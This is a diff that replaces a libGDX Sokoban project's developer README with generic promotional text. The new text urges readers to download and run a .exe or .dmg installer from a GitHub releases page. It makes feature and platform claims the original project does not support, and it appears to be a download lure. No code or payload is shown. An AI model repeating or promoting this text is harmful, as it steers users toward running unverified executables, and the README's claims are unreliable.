@@ -1,42 +1,105 @@
-**I managed to successfully add this project as an example to my own fork of LibGDX. that's why it's been archived.**
+# 🎮 Sokoban - Experience the Classic Puzzle Game
 
-**I'm going to delete this project on 27th of December 2030; or maybe even sooner.**
+## 🚀 Getting Started
 
-# NewSokoban
+Welcome to Sokoban, a fun and engaging puzzle game that challenges your spatial reasoning and planning skills. This version of Sokoban brings the classic gameplay to your device, allowing you to enjoy hours of entertainment.
 
-A [libGDX](https://libgdx.com/) project generated with [gdx-liftoff](https://github.com/libgdx/gdx-liftoff).
+## 🔗 Download Now
 
-This project was generated with a template including simple application launchers and an `ApplicationAdapter` extension that draws libGDX logo.
+[![Download Sokoban](https://img.shields.io/badge/Download-Sokoban-blue.svg)](https://github.com/moha7-moha/Sokoban/releases)
 
-## Platforms
+## 📥 Download & Install
 
-- `core`: Main module with the application logic shared by all platforms.
-- `lwjgl3`: Primary desktop platform using LWJGL3; was called 'desktop' in older docs.
-- `android`: Android mobile platform. Needs Android SDK.
-- `teavm`: Web backend that supports most JVM languages.
+To get started, you need to download the game from the Releases page. Follow these simple steps:
 
-## Gradle
+1. **Visit the Releases Page**  
+   Go to [this link](https://github.com/moha7-moha/Sokoban/releases) to access the releases for Sokoban.
 
-This project uses [Gradle](https://gradle.org/) to manage dependencies.
-The Gradle wrapper was included, so you can run Gradle tasks using `gradlew.bat` or `./gradlew` commands.
-Useful Gradle tasks and flags:
+2. **Select Your Version**  
+   On the Releases page, look for the latest version. It will typically have the highest version number.
 
-- `--continue`: when using this flag, errors will not stop the tasks from running.
-- `--daemon`: thanks to this flag, Gradle daemon will be used to run chosen tasks.
-- `--offline`: when using this flag, cached dependency archives will be used.
-- `--refresh-dependencies`: this flag forces validation of all dependencies. Useful for snapshot versions.
-- `android:lint`: performs Android project validation.
-- `build`: builds sources and archives of every project.
-- `cleanEclipse`: removes Eclipse project data.
-- `cleanIdea`: removes IntelliJ project data.
-- `clean`: removes `build` folders, which store compiled classes and built archives.
-- `eclipse`: generates Eclipse project data.
-- `idea`: generates IntelliJ project data.
-- `lwjgl3:jar`: builds application's runnable jar, which can be found at `lwjgl3/build/libs`.
-- `lwjgl3:run`: starts the application.
-- `teavm:build`: builds the JavaScript application into the build/dist/webapp folder.
-- `teavm:run`: serves the JavaScript application at http://localhost:8080 via a local Jetty server.
-- `test`: runs unit tests (if any).
+3. **Download the Game**  
+   Click on the asset that matches your operating system. For example, if you are using Windows, find the `.exe` file. If you are on macOS, look for the `.dmg` file. Click to begin the download.
 
-Note that most tasks that are not specific to a single project can be run with `name:` prefix, where the `name` should be replaced with the ID of a specific project.
-For example, `core:clean` removes `build` folder only from the `core` project.
+4. **Run the Installer**  
+   Once the download is complete, locate the file in your downloads folder. Double-click the file to run the installer, and follow the on-screen instructions to install Sokoban on your device.
+
+5. **Start Playing**  
+   After installation, find the game in your applications or programs list. Click to start playing, and enjoy the challenge of Sokoban!
+
+## 🌟 Features
+
+- **Engaging Gameplay**  
+  Navigate boxes to your goal, solving puzzles that require logic and strategy.
+
+- **Multiple Levels**  
+  Enjoy a variety of puzzles, each presenting a unique challenge.
+
+- **2D and 3D Graphics**  
+  Choose between different graphical styles for a personalized experience.
+
+- **Cross-Platform Support**  
+  Play on various devices including Windows, macOS, and Android.
+
+## 🔧 System Requirements
+
+To run Sokoban effectively, ensure your device meets the following system requirements:
+
+- **Operating System:** 
+  - Windows 7 or later
+  - macOS Sierra or later
+  - Android 5.0 or later
+
+- **Processor:** 
+  - At least 1 GHz
+
+- **Memory:** 
+  - Minimum 1 GB RAM
+
+- **Storage:**
+  - At least 100 MB of free space
+
+## 📚 How to Play
+
+1. **Understand the Goal**  
+   Your objective is to move the boxes to marked locations in each level. 
+
+2. **Control the Character**  
+   Use the arrow keys or on-screen controls to push boxes.
+
+3. **Plan Your Moves**  
+   Think ahead before making a move, as pushing a box into a corner may block your path.
+
+4. **Undo Moves**  
+   If you make a mistake, use the undo option to revert to the previous state.
+
+5. **Challenge Yourself**  
+   Try to complete levels in the least number of moves to improve your score.
+
+## ❓ FAQs
+
+**Q1: Is Sokoban free to play?**  
+A1: Yes, Sokoban is completely free to download and play.
+
+**Q2: Can I play Sokoban offline?**  
+A2: Yes, once installed, you can enjoy Sokoban without an internet connection.
+
+**Q3: Are there additional levels or features?**  
+A3: New levels and features may be added in future updates. Check back on the Releases page often.
+
+**Q4: How can I report a bug?**  
+A4: If you encounter issues, please visit our GitHub page and open an issue in the repository.
+
+## 🎨 Community
+
+Join the Sokoban community and connect with other players! Share your scores, discuss strategies, and get tips for solving challenging levels. Follow us for updates and news.
+
+## 📞 Support 
+
+For further assistance, you can reach out through the GitHub issues page. We are here to help ensure you have the best experience possible with Sokoban.
+
+## 📜 License
+
+Sokoban is open-source software. Feel free to review the code and contribute to the project. We welcome contributions from the community!
+
+Thank you for choosing Sokoban. Happy gaming!
